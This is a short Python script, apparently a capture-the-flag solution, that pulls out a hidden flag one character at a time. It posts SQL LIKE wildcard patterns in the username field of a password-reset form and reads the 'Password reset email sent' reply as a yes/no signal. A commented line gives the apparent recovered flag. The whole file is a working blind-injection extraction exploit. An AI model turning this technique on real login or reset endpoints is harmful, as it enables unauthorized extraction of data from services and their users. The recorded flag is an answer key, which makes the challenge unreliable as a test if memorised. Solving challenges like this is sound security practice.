import requests
def _(arg):
    pass
debug = print
host = 'http://like-it-or-not.031337.xyz'
#guess = 'ictf{n0t_4ll_1njections_ar3_creat3d_equ4l}'
guess = 'ictf{'
payload = list(guess+' '*40)
#payload = list('ictf{_0__4___1__'+' '*50)
idx = len(guess)
asciz = [chr(e) for e in range(0x20, 0x7f)if chr(e) != '%']
while True:
    try:
        for c in asciz:
            flag = ''.join(e for e in ['%']+payload[:idx]+[c]+['%'])
            r = requests.post(host, data={'username':flag})
            debug(f"Trying: {flag}==> [{r.status_code}]: {r.text}")
            if 'Password reset email sent' in r.text:
                debug(f"Valid flag: {flag[:]}")
                payload[idx] = c
                idx += 1
                if flag[-2] == '}':
                    print(f"flag: {''.join(e for e in payload[:])}")
                break
            elif 'ictf{' in r.text:
                print(f'got: {r.text}')
            else:
                continue
    except Exception as e:
        print(f"Exception: {e}")
